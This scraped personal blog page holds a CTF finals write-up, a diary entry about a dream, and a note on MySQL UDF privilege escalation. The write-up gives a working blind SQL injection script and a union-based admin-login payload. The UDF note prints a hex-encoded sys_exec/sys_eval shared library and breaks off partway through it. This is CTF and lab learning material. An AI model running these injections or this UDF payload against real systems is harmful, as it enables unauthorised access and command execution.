  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B/" class="post-title-link" itemprop="url">长城杯复赛</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-14 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-14T00:00:00+08:00">2024-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:17:49" itemprop="dateModified" datetime="2024-09-19T21:17:49+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="长城杯复赛"><a href="#长城杯复赛" class="headerlink" title="长城杯复赛"></a>长城杯复赛</h1><p>线下赛没有线上紧张，第一是自己的事情，第二不用抢题做，大概我还在愚昧之峰；</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="GreatSQL"><a href="#GreatSQL" class="headerlink" title="GreatSQL"></a>GreatSQL</h3><p>说是 sqlmap 可以梭？倒显得我不会用 sqlmap 了；</p>
<p>一个登录框，登录成功即可获得 flag ；</p>
<p>会提示用户是否存在，随便试了几个，admin 不存在，user 存在；</p>
<p>盲注爆一下 user 的密码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.48.123:39446/login&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    right_password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> password_i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnm&#x27;</span>:</span><br><span class="line">            ascii_i = <span class="built_in">ord</span>(char)</span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">f&quot;user\&#x27;and ascii(substr(password,<span class="subst">&#123;password_i&#125;</span>,1))=<span class="subst">&#123;ascii_i&#125;</span>;#&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;qst&quot;</span>&#125;</span><br><span class="line">            resp = requests.post(url=url,data = data)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(resp.text) == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(ascii_i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                right_password = right_password+<span class="built_in">chr</span>(ascii_i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;now:<span class="subst">&#123;right_password&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(password_i)</span><br><span class="line"><span class="comment"># now:e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure>

<p>爆 md5，密码是 <code>md5(&#39;123456&#39;)</code>；</p>
<p>登录提示要 login as admin，类似盲注爆一下用户名，爆出 test，pika 两个，分别爆密码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="comment"># now:098f6bcd4621d373cade4e832627b4f6</span></span><br><span class="line"><span class="comment"># md5(&#x27;test&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pika</span></span><br><span class="line"><span class="comment"># now:81ccafb8ef19e583f737f569c51d3cde</span></span><br><span class="line"><span class="comment"># not a weak md5</span></span><br></pre></td></tr></table></figure>

<p>登了没用，没有 admin；</p>
<p>sql 执行出错会报不存在，测一下后台 <code>select</code> 的列数，username 为<code>user&#39; union select 1,2,3,4</code> 显示密码错误而非不存在，说明结果有四列；</p>
<p>最终 payload：</p>
<p><code>urlencode(&#39;username=usr&#39; union select 1,2,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;admin&#39;;#&amp;password=123456)</code>；</p>
<h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>需要看一些 Java，我总感觉 OpenGauss 连网条件下应该很简单；</p>
<p>还需要学学如何配网；</p>
<p>然后把 sqlmap 用明白。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/10/2024-09-10-%E5%A3%B9%E4%B8%AA%E6%A2%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/10/2024-09-10-%E5%A3%B9%E4%B8%AA%E6%A2%A6/" class="post-title-link" itemprop="url">壹个梦</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-09-10 00:00:00 / Modified: 18:53:42" itemprop="dateCreated datePublished" datetime="2024-09-10T00:00:00+08:00">2024-09-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="壹个梦"><a href="#壹个梦" class="headerlink" title="壹个梦"></a>壹个梦</h1><p>好热血啊感觉，和离人哀吹牛逼吹出来的她自己一样；</p>
<p>睡醒保护自己，总要加工一下的，嘴里说出来的梦半真半假，现在去回忆，已然混作一团，全当真的去了；</p>
<p>啊，操，我是真的很懂我自己；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://i.imgur.com/qKe4SuM.png"></p>
<h2 id="最喜欢的某种设定"><a href="#最喜欢的某种设定" class="headerlink" title="最喜欢的某种设定"></a>最喜欢的某种设定</h2><p>说不上来，大概是某种我没有经历过但却幻想自己经历过的真实，比如热血青春；</p>
<p><img src="https://i.imgur.com/jdNzM7Z.png"></p>
<p>像这样：</p>
<p><img src="https://i.imgur.com/Cu1hRZK.png"></p>
<h2 id="次喜欢的某种设定"><a href="#次喜欢的某种设定" class="headerlink" title="次喜欢的某种设定"></a>次喜欢的某种设定</h2><p>我，自恋型人格，无障碍，S，暴力 S；</p>
<p><img src="https://i.imgur.com/sQlVHzo.png"></p>
<h2 id="自我保护"><a href="#自我保护" class="headerlink" title="自我保护"></a>自我保护</h2><p>不能沉溺咯，那是你错过了又回不去的沈阳；</p>
<p><img src="https://i.imgur.com/44MS2pW.png"></p>
<h2 id="全没睡"><a href="#全没睡" class="headerlink" title="全没睡"></a>全没睡</h2><p>搞笑了；</p>
<p><img src="https://i.imgur.com/8XqESuO.png"></p>
<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>我总感觉梦到那些他她死去，是一件很龌龊的事情，难道你觉得对他人此生的奉献已经足够？你已经做得足够好？</p>
<p>差得远了，小秦，醒醒！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/08/2024-09-08-%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/08/2024-09-08-%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/" class="post-title-link" itemprop="url">提权学习之壹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-08 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-08T00:00:00+08:00">2024-09-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-15 15:06:07" itemprop="dateModified" datetime="2024-09-15T15:06:07+08:00">2024-09-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="提权学习之壹"><a href="#提权学习之壹" class="headerlink" title="提权学习之壹"></a>提权学习之壹</h1><p>After getting shell；</p>
<h2 id="Mysql-UDF"><a href="#Mysql-UDF" class="headerlink" title="Mysql UDF"></a>Mysql UDF</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>docker</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Notice the order of args</span></span><br><span class="line">docker run <span class="literal">--name</span> udf<span class="literal">-test-mysql</span> <span class="literal">-p</span> <span class="number">33333</span>:<span class="number">3306</span> `</span><br><span class="line"><span class="literal">-v</span> <span class="string">&quot;D:\works\Privilege Escalation\Mysql UDF\Docker Environment\mysql\log:/var/log/mysql&quot;</span> `</span><br><span class="line"><span class="literal">-v</span> <span class="string">&quot;D:\works\Privilege Escalation\Mysql UDF\Docker Environment\mysql\data:/var/lib/mysql&quot;</span> `</span><br><span class="line"><span class="literal">-e</span> MYSQL_ALLOW_EMPTY_PASSWORD=yes <span class="literal">-d</span> mysql:<span class="number">9.0</span>.<span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p><strong>连接</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hlocalhost -P33333 -uroot</span><br></pre></td></tr></table></figure>

<h3 id="RCE-操作"><a href="#RCE-操作" class="headerlink" title="RCE 操作"></a>RCE 操作</h3><p>检查 UDF 相关变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;%plugin%&quot;;</span><br><span class="line">/*</span><br><span class="line">+-----------------------------------------------+--------------------------+</span><br><span class="line">| Variable_name                                 | Value                    |</span><br><span class="line">+-----------------------------------------------+--------------------------+</span><br><span class="line">| plugin_dir                                    | /usr/lib64/mysql/plugin/ |</span><br><span class="line">| replication_optimize_for_static_plugin_config | OFF                      |</span><br><span class="line">+-----------------------------------------------+--------------------------+</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SHOW VARIABLES LIKE &quot;%secure_file%&quot;;</span><br><span class="line">/*</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| Variable_name    | Value                 |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| secure_file_priv | /var/lib/mysql-files/ |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>这里发现 <code>secure_file_priv</code> 不为空，不符合 UDF 提权条件，手动改一下 <code>/etc/my.cnf</code>；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># secure-file-priv=xxx</span><br><span class="line">secure-file-priv=</span><br></pre></td></tr></table></figure>

<p>还要修改 <code>/usr/lib64/mysql/plugin/</code> 的写权限；</p>
<p>尝试写文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;1111&#x27;</span> into dumpfile <span class="string">&#x27;/usr/lib64/mysql/plugin/&#x27;</span>;</span><br><span class="line"><span class="comment"># Query OK, 1 row affected (0.001 sec)</span></span><br></pre></td></tr></table></figure>

<p>可以开始操作了，随便找个 payload 试试水：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">od</span> /usr/share/sqlmap/data/udf/postgresql/linux/64/9.6/lib_postgresqludf_sys.so_ -An -t x | <span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># 0b9aaa3d933b3a1976f47629a935024b42843605c8d2427a7b5e107ea7cd6c4ed771d77d05645c9089338cf377ceaa870865b0be15cefef76995cb5ed032e52af3fb6393961c1328b117531a102779627bf986f2fee81feee42a22a60dd36202a54cd9f982f4243e98f3b54b6d038c729c8acb9a7f8f2815d8ac32bfe18dd2845171ba6f78e1c5b3d687597b156005761825400ab003e6a4228355fde3beac0cb19c26d3da09fe187ca4f8917d5c7d95311eca2fef4b6b08c9b72c573bf0368f34aa239368718cd3ca0bf2cff35493f49b6add4b6f18a6b1d2e91da3a3ad6ff2e6e8c2266226899553ca1af8a5660acd9ec5adf39e27a028d1ae008308f4420836ce35db07e4a3295e848e3d1c3aa688b14a6911bcb0bf4fdbb5c6de32bbc46735c0bc93538cfa9d9d5c256f0daeafbdb4604926ad431a56c2ba70fb5a9a76e8a608793949d5ea9beb6eb6b375592b9c4812c94713b96c1c50e8237073f885cfd4e7e9483b65641dea7e040c98109991baa4ddb5cadd6481bc41f6f071f86b7f66ddc8c8b5cfc9989acf634fdfb95da6f610ca2c8ca11d831c4913cd53bb61b5f5084477479787c64dd97abdb1b2efc1cd9426a28242aa035aea4477191c9dcaa14ecce677ce4f4d575db1f0a5812abd9be40ce661f566a22bbd8436f970efeda3f411b8b13b2439a8bd05b32988645f4da43139bef1f17c2ac76abf4404e7e7af46c196ddd39014cc7ba2ce36e527ae19b99f4b30afcfb7d6c9469e29db80d0570d037f4807fc2bbc530006c362ff5eed51c80d5c77722eca141c122bfb83d770488b2a6fbd951943834bfb7cfcdc2c14bde3a57f54c74c6ba261ec833d1ebb83de4caf0c9fb93f6a64af8e2e7cd4d277f0126c5e117e5b43fe28ec6a0787ced4e917adffcc08d24f7f19a1ee15ebba250e146090a06b1a5ee2ac492432226112e68ffc6005baeb8e9a161197f88f5e32d61658382c8daa277b17c5efea3781a0192acd8c200ce6e30441237db2c31632c94c943f024d1ab77c04b2db49819b6b09ea523123f9865541b0c7ba7d8703ee33dbe263ac3bbcc5e24a4bfb2f92ea8b9b15c162b6cb6465bc95c9772c914a8317a700e5117420cdb2271333f32dcedcde9c4530c2f94e206700a6df1876b07bb71b515b3584511aaad2cfcd4f0a60d4bb29318defa71de36f3730957012e2f5b6f9aa937119ae6b7d9c0ca48e17f6fc8ecb42f246f9cd9d81659e2778e5962e02d308b50ef00bb3a0222993b6a3f2b1e44959799424459486d6be1289bf55b1f6be07a0074acf82cc0bc873cd5a9c783849db79962e8706b387f132a3377a67166bbbbc8bd9a568bd55bdbb8db6cdd3c90ef66245af81797bb8f44fa4eafcaa9259cba307d83e8add3748013911a1ae86f99f836ea99c26baa97fbb88f65f60090e023c8d49a55c858e3b8fa4f9fd302e51adb607b005503e0d9db7d4726d0433c2277c461f4dab301d3e71d8914ada203896a622e679f9905b62ceffad2dad63cb57d9466778d2a0d57404558a531f8f975956eceea65fbe195fc37d35217080bc6b2cfb73a45441f1951b4ff2c50e153cb950c5df402ece0ddfa8ddd860402b54759bad6d6bfb11c5735cffcf6b5b4de87454f39349a9659dd3c602c6574657a81617e416cded7bf1ad069fe09b618679bebb00a5ea59036719a8d89fdd8250befc5f54059c5aaf774105563a86a6a0cbe1ebe10e45a1feb8dbcd44e7d5815b54b0acdb25e2473ee1ae78eee80c78d1e60b8d1170c51679dd67a3e89c74906d6f807e64a932fa5e5ff650985bc39d15ccc12a3c1fc257a874bad460b992725aa258573665ba11830ffc110cc4392d43b105b946da252c421d01a61c4ecb2a7e8c19049c7f173a1da8254c8773a5a7fde8e9e0eaa10c2ced3a7b3044a9bb17e12731e61dac8d3ad541c2e1d98da4d5d1ee83e66541d32caacbd79b41c2e906340fe8eda2ddac57b84eebac940d6f273068df8d1fa207722ea2c5a78cfde9848866461d86a70337209f01af5a08e4356b9ec348c98107d4f194c0710971cf2fc6bc9577f08e62a668a133df5079266470edbbabf66eb55588f1b5223dae6db37f4f03d30b0db36db07465eeb2a8e6042b1cbfed6971482ff0a91be0b3c8faeb7528d2d108065ab007e983182bf84303a3664355c2e4e1bda9f655a4dbbbc37f207b03aa69ad64c8ca6b9e5ff0e900f22195712fa93a25bdf96576914e8dc4f13f03402a3afd8a58e0822d5fb9c8f80e3ef627506bdd08d2d02e931d6e3e4d2ac3d30171e409d540f31414a43d3c0c802725efd89c1691eeec1b9b12e73ac52cdf8facc737bc7932973e2af096a3a331bfb6e1adc62b7e1153fb79fc7fa7f7c1f3927d2ff1c2a48a12afe4ea414e0ffac3dad92e98b61b34ae2c8ce7f2acaf0e82f988dbe828517c29988513ada873c4bebab1e41f2ec6b9e43fec9562de55ce2c0b8673e581b764b3338c6fa82d3b07c2c1a0e174419298d1693ede29ed943476ebf0a6b15e41fb627988da2b6454b193a36e94ad7813e98c8ddac3a0d17a82d79dcfc547017443232762f206b77d1f87638a6e8fcdf08fbce5a893a97442defb371fef65c758f641f25860e30490ba14e2e29f3c0aca0dbc93f04bd46af824443795a82f4e62866c4a5578f36eb56c047cc9e59ffd1811bb269c1ad944c0880ee4ed59a71cfbdbad3424fc44b36510a5c06969cab7c820cc927091d937a4246603140839ee8e9af5fe2e9d7e137d83e9895b7d55c333d8ec20caf378f70089ad7a188abfd5219807825abc6f7fd2f75a7d79cf388a6fd888aadfa4657fe1e1c624c10ad8f6d8e20ddeacd513a70adb9fa486ab01f7b09157d6e5d20f29aa95ce5dc1a4ff2b6a139537030d1384836952d9f19cc1d0359b2d7b66dd08ecc1994f446bc27db33e1d87ef59385ce99576be6192bc495ebfe7ec2993413c6eae9cb7e9a942a11fe3c0eb15111c87522324780bc424a38e55697fcac7925598485309f73275d00f9433568a97652144c38744cc7c754525d2c35979dca08ae6268475e947d69f2de5484459f9814342db0c50eacf8f4d3caa5edc679614f109ecd18ab39a1bb7b57359b308c0cc4898a7137be23db974557c834a3b1efa04ca7557bc7b014508eb098df059dcae7810b08dd4c679f8a918473d6c11f78b492599fc47fb5f3426f8c325dea495b3dac75409b9cd0112428a6a6f362f0fdd6154d522bc5b2508b9d36a479e19a71c4eff57dbdee92dbe71c0c3a791db8aad477cfdf434d845b9024c97c956adf01ae065f273a411fd35e5e176d493ec383629a86d23721e1ed874520a6228718a9228ce038575823dae130a6fa3de09482ac7931e659775981938b797a5b9bb212596a94a98cf97972043da252f522f6ac64c365e66a690c92cbb10f80ce1042ab5e1e47795e89282bec7b188de490147bf13a6936183179ac09fab2382a945199c5fbaff60d0299a0a9fc9c980bc1f2f50387b23292e01646d01cf98aa976d0ba5f5de09a11bcb57dbc7b07f1f25a36d93c1a6cc3409a8fc199e48098ff7d6933bd1ed24795f4aec882b98571fec2eda0e8e9938954481a67c9295464fba2dee2bcd97502d8c3abb89b7a2fb094feeb7248b14638bfa802220769a1f9e2414c6f97494dbd50c04da450467bb2cb42b7d11757e253471da8423069a1f189bc4861c23778f4d976bbac4c15a57</span></span><br></pre></td></tr></table></figure>

<p>写入 .so 文件（不是同一个）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C